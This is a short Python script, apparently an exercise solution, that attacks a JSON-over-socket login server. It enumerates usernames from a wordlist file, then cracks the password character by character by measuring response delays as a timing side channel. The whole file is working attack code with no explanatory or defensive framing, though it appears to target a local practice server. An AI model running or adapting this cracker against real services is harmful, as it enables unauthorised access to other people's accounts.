# write your code here
import sys, socket, string, itertools, pathlib, json, datetime



current_path = pathlib.Path(__file__).parent.absolute()

args = sys.argv
# args = [' ', '127.0.0.1', '9090']
hostname = args[1]
port = int(args[2])

all_symbols = string.ascii_letters + string.digits

def pwd_crack(hostname, port):
    soc = socket.socket()
    soc.connect((hostname, port))

    file = open(current_path / "logins.txt")

    req = {"login": "", "password": " "}

    # hacking login
    for line in file:
        login = line.strip()
        req["login"] = login
        soc.send(json.dumps(req).encode())
        resp = json.loads(soc.recv(1024).decode())
        if resp["result"] == "Wrong password!":
            file.close()
            break

    # hacking password
    pwd = []
    success = False

    req["password"] = " "
    # start = datetime.now()
    # soc.send(json.dumps(req).encode())
    # resp = json.loads(soc.recv(1024).decode())
    # finish = datetime.now()
    # difference_norm = finish - start

    while not success:
        pwd.append("a")
        for symb in all_symbols:
            pwd[-1] = symb
            req["password"] = "".join(pwd)
            soc.send(json.dumps(req).encode())
            start = datetime.datetime.now()
            resp = json.loads(soc.recv(1024).decode())
            finish = datetime.datetime.now()
            difference = finish - start
            if resp["result"] == "Connection success!":
                success = True
                soc.close()
                break
            if difference.total_seconds() > 0.1:
                break

    print(json.dumps(req))



pwd_crack(hostname, port)